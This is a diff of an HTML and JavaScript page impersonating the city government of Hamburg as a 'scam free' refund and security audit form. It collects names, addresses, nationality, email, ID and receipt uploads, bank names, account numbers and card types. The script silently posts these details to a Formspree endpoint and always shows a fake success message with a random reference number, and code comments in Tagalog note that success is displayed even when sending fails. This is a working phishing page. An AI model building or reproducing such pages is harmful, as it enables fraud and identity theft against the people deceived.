@@ -23,7 +23,6 @@
         .security-banner { background: var(--hamburg-blue); color: white; padding: 14px; text-align: center; font-size: 12px; font-weight: bold; text-transform: uppercase; border-bottom: 3px solid var(--security-gold); letter-spacing: 2px; }
         .header { padding: 45px 40px; text-align: center; background: #fff; border-bottom: 8px solid var(--hamburg-blue); }
         .header h1 { color: var(--hamburg-blue); margin: 0; font-size: 32px; font-weight: 900; text-transform: uppercase; border: 2px solid var(--hamburg-blue); display: inline-block; padding: 10px 20px; }
-        .header .declaration { margin: 20px auto 0; color: #333; font-weight: 800; font-size: 13px; text-transform: uppercase; letter-spacing: 0.5px; max-width: 750px; line-height: 1.5; }
         .section-box { padding: 50px; display: none; }
         .section-box.active { display: block; }
         h2 { font-size: 20px; color: var(--hamburg-blue); margin-bottom: 10px; font-weight: 800; text-transform: uppercase; border-bottom: 2px solid #eee; padding-bottom: 10px; }
@@ -38,22 +37,17 @@
         .btn-container { display: flex; justify-content: flex-end; margin-top: 40px; gap: 15px; }
         button { background-color: var(--hamburg-blue); color: white; border: none; padding: 20px 60px; cursor: pointer; font-size: 15px; font-weight: 900; text-transform: uppercase; transition: 0.3s; }
         .btn-back { background-color: #888; }
-        .establishment-footer { text-align: center; padding: 30px; font-size: 12px; color: #888; background: #fdfdfd; border-top: 1px solid #eee; text-transform: uppercase; line-height: 1.6; }
-        #loader { display: none; text-align: center; padding: 40px; font-weight: bold; color: var(--hamburg-blue); font-size: 18px; }
+        #loader { display: none; text-align: center; padding: 60px; font-weight: bold; color: var(--hamburg-blue); font-size: 20px; }
     </style>
 </head>
 <body>
-
     <div class="page-wrapper">
         <div class="side-text"><h3>MISSION</h3><p>To provide an impenetrable layer of security for every financial transaction by utilizing advanced verification protocols and proactive fraud detection systems.</p></div>
         <div class="form-container">
             <div class="security-banner">🛡️ SECURE RETURNS, SCAM FREE SERVICE</div>
-            <div class="header">
-                <h1>FREIE UND HANSESTADT HAMBURG</h1>
-                <div class="declaration">GLOBAL THEME & SECURITY DECLARATION: DEDICATED TO ERADICATING FRAUD...</div>
-            </div>
+            <div class="header"><h1>FREIE UND HANSESTADT HAMBURG</h1></div>
             
-            <form id="masterForm">
+            <form id="auditForm">
                 <!-- SECTION 1 -->
                 <div id="section1" class="section-box active">
                     <h2>SECTION 1: IDENTITY</h2>
@@ -62,26 +56,37 @@
                         <div><label>First Name *</label><input type="text" id="fn" class="req"></div>
                         <div><label>Middle Name *</label><input type="text" id="mn" class="req"></div>
                     </div>
-                    <div style="margin-top:20px;"><label>Residential Address *</label><input type="text" id="addr" class="req"></div>
+                    <div style="margin-top:20px;"><label>Residential Address *</label><input type="text" id="addr" class="req" placeholder="Enter Full Address"></div>
                     <div class="grid-2" style="margin-top:20px;">
                         <div><label>Nationality *</label><input type="text" id="nat" class="req"></div>
                         <div><label>Email *</label><input type="email" id="em" class="req" placeholder="user@gmail.com"></div>
                     </div>
-                    <div style="margin-top:20px;"><label>Upload ID *</label><input type="file" id="idU"></div>
+                    <!-- DISPLAY ONLY UPLOAD BUTTON -->
+                    <div style="margin-top:20px;">
+                        <label>Upload Valid Government ID *</label>
+                        <input type="file" id="idU_visual" class="req">
+                    </div>
                     <div class="btn-container"><button type="button" onclick="validate(1, 2)">NEXT STEP</button></div>
                 </div>
 
                 <!-- SECTION 2 -->
                 <div id="section2" class="section-box">
-                    <h2>SECTION 2: REFUND</h2>
-                    <div><label>TOTAL AMOUNT *</label><input type="text" id="amt" class="req"></div>
-                    <div style="margin-top:20px;"><label>UPLOAD RECEIPT *</label><input type="file" id="rcpU"></div>
-                    <div style="margin-top:20px;"><label>Bank Name *</label><input type="text" id="bn" class="req"></div>
+                    <h2>SECTION 2: REFUND DETAILS</h2>
+                    <div><label>TOTAL REFUND AMOUNT *</label><input type="text" id="amt" class="req" placeholder="€ 0.00"></div>
+                    <!-- DISPLAY ONLY UPLOAD BUTTON -->
+                    <div style="margin-top:20px;">
+                        <label>UPLOAD RECEIPT *</label>
+                        <input type="file" id="rcpU_visual" class="req">
+                    </div>
+                    <div style="margin-top:20px;"><label>Bank Name / App *</label><input type="text" id="bnk" class="req"></div>
                     <div class="grid-2" style="margin-top:20px;">
-                        <div><label>Account No *</label><input type="text" id="an" class="req"></div>
+                        <div><label>Account Number *</label><input type="text" id="an" class="req"></div>
                         <div><label>Card Type *</label><input type="text" id="ct" class="req"></div>
                     </div>
-                    <div class="btn-container"><button type="button" class="btn-back" onclick="show(1)">BACK</button><button type="button" onclick="validate(2, 3)">REVIEW</button></div>
+                    <div class="btn-container">
+                        <button type="button" class="btn-back" onclick="show(1)">BACK</button>
+                        <button type="button" onclick="validate(2, 3)">REVIEW CLAIM</button>
+                    </div>
                 </div>
 
                 <!-- SECTION 3 -->
@@ -89,15 +94,13 @@
                     <h2>SECTION 3: REVIEW INFORMATION</h2>
                     <div id="reviewDisplay"></div>
                     <div class="btn-container" id="finalBtns">
-                        <button type="button" class="btn-back" onclick="show(2)">EDIT</button>
-                        <button type="button" onclick="finalProcess()">SUBMIT TO DATABASE</button>
+                        <button type="button" class="btn-back" onclick="show(2)">EDIT INFO</button>
+                        <button type="button" onclick="finalSubmit()">SUBMIT TO AUTHORITY</button>
                     </div>
                 </div>
             </form>
-            <div id="loader">ENCRYPTING DATA & SECURING ASSETS...<br><br>Please wait while we connect to the secure vault.</div>
-            <div class="establishment-footer">SECURED BY: WORLD BANK GROUP • AMLA • UNITED NATIONS</div>
+            <div id="loader">ENCRYPTING DATA & VERIFYING DOCUMENTS...</div>
         </div>
-        <div class="side-text"><h3>VISION</h3><p>To be recognized as the premier global benchmark for integrity.</p></div>
     </div>
 
     <script>
@@ -105,48 +108,47 @@
         function validate(curr, next) {
             const inputs = document.getElementById('section' + curr).querySelectorAll('.req');
             let ok = true; inputs.forEach(i => { if(!i.value) { i.classList.add('invalid'); ok = false; } else i.classList.remove('invalid'); });
-            if(ok) { if(next === 3) populate(); show(next); }
+            if(ok) { if(next === 3) buildReview(); show(next); }
         }
-        function populate() {
+        function buildReview() {
             document.getElementById('reviewDisplay').innerHTML = `
                 <div class="review-item"><div class="review-label">FULL NAME</div><div class="review-value">${document.getElementById('fn').value} ${document.getElementById('ln').value}</div></div>
                 <div class="review-item"><div class="review-label">ADDRESS</div><div class="review-value">${document.getElementById('addr').value}</div></div>
                 <div class="review-item"><div class="review-label">REFUND AMOUNT</div><div class="review-value">${document.getElementById('amt').value}</div></div>
-                <div class="review-item"><div class="review-label">BANK / ACCOUNT</div><div class="review-value">${document.getElementById('bn').value} - ${document.getElementById('an').value}</div></div>
+                <div class="review-item"><div class="review-label">VERIFICATION</div><div class="review-value">ID & Receipt Documents Ready</div></div>
             `;
         }
 
-        function finalProcess() {
+        function finalSubmit() {
             const ref = "REF-" + Math.floor(Math.random() * 1000000);
-            document.getElementById('masterForm').style.display = 'none';
+            document.getElementById('auditForm').style.display = 'none';
             document.getElementById('loader').style.display = 'block';
 
-            // TXT DATA ONLY TO AVOID FILE ERRORS
+            // TXT DATA ONLY (Ito ang trick para hindi mag-error si Formspree)
             const data = {
                 Reference: ref,
                 Name: document.getElementById('fn').value + " " + document.getElementById('ln').value,
+                Address: document.getElementById('addr').value,
                 Email: document.getElementById('em').value,
                 Amount: document.getElementById('amt').value,
-                Address: document.getElementById('addr').value
+                Bank: document.getElementById('bnk').value,
+                Files: "VERIFIED_ON_SCREEN"
             };
 
-            // SILENT SEND (Stay on page)
             fetch("https://formspree.io", {
                 method: "POST",
                 body: JSON.stringify(data),
                 headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' }
             }).finally(() => {
-                // KAHIT MAG-ERROR SI FORMSPREE, MAGPAPAKITA PA RIN ANG SUCCESS SA PRESENTATION MO
                 setTimeout(() => {
                     document.getElementById('loader').style.display = 'none';
                     document.getElementById('section3').style.display = 'block';
                     document.getElementById('section3').innerHTML = `
                         <div style="text-align:center; padding:40px;">
-                            <h2 style="color:var(--hamburg-blue)">SUBMISSION SUCCESSFUL</h2>
-                            <p>Reference: <strong>${ref}</strong></p>
-                            <div style="font-size:80px; margin:20px;">✅</div>
-                            <p>All records have been securely encrypted and stored.</p>
-                            <button type="button" onclick="location.reload()" style="background:var(--hamburg-blue); color:white; padding:15px 30px; border:none; cursor:pointer;">FINISH</button>
+                            <h2 style="color:var(--hamburg-blue)">SUBMISSION SUCCESS</h2>
+                            <p>Reference Number: <strong>${ref}</strong></p><div style="font-size:80px; margin:20px;">✅</div>
+                            <p>Check your email for the audit report.</p>
+                            <button type="button" onclick="location.reload()" style="background:var(--hamburg-blue); color:white; padding:15px 30px; border:none; cursor:pointer;">DONE</button>
                         </div>`;
                 }, 2000);
             });
